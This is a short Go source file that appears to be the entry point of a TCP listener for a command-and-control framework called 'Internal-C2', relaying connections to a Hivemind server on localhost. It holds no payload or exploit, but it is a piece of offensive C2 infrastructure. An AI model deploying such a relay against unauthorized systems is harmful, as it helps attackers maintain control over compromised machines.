package main

import (
	"fmt"

	"github.com/ProjectHivemind/Internal-C2/pkg/listeners/tcp"
)

const HIVEMIND_IP = "localhost"
const HIVEMIND_PORT = ":1234"
const HIVEMIND_TRANSPORT = "tcp"
const LISTEN_PORT = "45123"

func main() {
	switch HIVEMIND_TRANSPORT {
	case "tcp":
		tcp.StartListener(LISTEN_PORT, HIVEMIND_IP+HIVEMIND_PORT)
	default:
		fmt.Println("No valid transport detected.")
	}
}
